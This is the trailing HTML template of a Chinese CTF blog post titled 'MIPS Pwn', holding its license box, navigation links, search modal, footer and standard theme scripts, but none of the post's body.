+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>MIPS Pwn</div>
+      <div>http://nanhang.top/2025/07/01/ctf/heter/mips/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>南行</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年7月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/07/01/ctf/re/go/" title="Go逆向分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Go逆向分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/07/01/ctf/heap/ptmalloc/" title="Ptmalloc2内存管理分析">
+                        <span class="hidden-mobile">Ptmalloc2内存管理分析</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
